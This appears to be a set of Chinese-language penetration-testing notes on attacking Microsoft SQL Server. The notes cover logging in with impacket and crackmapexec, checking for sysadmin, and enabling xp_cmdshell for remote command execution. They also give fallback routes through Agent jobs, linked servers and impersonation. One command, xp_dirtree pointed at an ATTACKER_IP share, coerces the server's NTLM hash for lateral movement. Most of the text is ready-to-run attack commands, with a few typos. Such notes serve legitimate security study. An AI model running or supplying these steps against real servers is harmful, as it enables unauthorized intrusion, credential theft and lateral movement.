# MSSQL（Micro soft Sql）

## 介绍

## 看到MSSQL最先想到

端口：1433/TCP（SQL Server），1433/UDP（SQL Browser）

目标：拿到可登录账号->确认权限（是不是sysadmin）->想办法执行命令(xp_cmdshall/Agent Job/其他)->用SQL服务账号权限提权/横向。

## 连接工具

impacket（最常用）

mssqlclient.py DOMAIN/user:pass@<ip> -windows-auth

如果是SQL身份验证（SQL Login）

mssqlclient.py user:pass@<ip>

CME:

crackmapexec mssql <ip> -u user -p pass

## 登录后第一件事：确认权限

mssqlclient.py：

SELECT SYSTEM_USER; --当前登录身份

SELECT USER_NAME(); --当前数据库用户

SELECT IS_SRVROLEMEMBER('sysadmin'); --1是sysadmin

SELECT @@VERSION; --版本

判断：

sysadmin = 1 你离RCE很近

sysadmin = 0 走提权sysadmin/走替代执行路径/走凭证横向

## 拿命令执行RCE主路径：xp_cmdshell

1）先看有没有开

EXEC sp_configure 'xp_cmdshell';

2）如果是sysadmin，可以开启

EXEC sp_configure 'show advanced options',1;RECONFIGURE;

EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;

3）执行系统命令

EXEC xp_cmdshell 'whoami';

EXEC xp_cmdshell 'ipconfig';

## 如果不是sysadmin

### 1）SQL Agent Job（需要权限/Agent开启）

如果能创建作业，有时可以跑cmd/powershell

### 2）Linked Server

目标：找有没有链接服务器、能布恩那个跨到更高权限的实例

EXEC sp_linkedservers;

### 3）Impresonation（EXECUTE AS）

看有没有可Impresonation的用户：

SELECT * FROM sys.database_permissions WHERE permission_name='IMPERSONATE';

## MSSQL 抓HASH/横向

没法直接RCE，通过SQL触发访问来抓NTLM:

让SQL Server访问你的SMB共享（诱发NTLM）

常见函数/过程

（1）xp_dirtree

（2）xp_fileexist

（3）xp_subdirs

EXEC xp_dirtree '\\ATTACKER_IP\share';

价值：

​	（1）抓到SQL Server服务账号的NTLM

​	（2）用于横向（SMB\WIMRM）

## 拿到OS权限后该关注

whoami

whoami /priv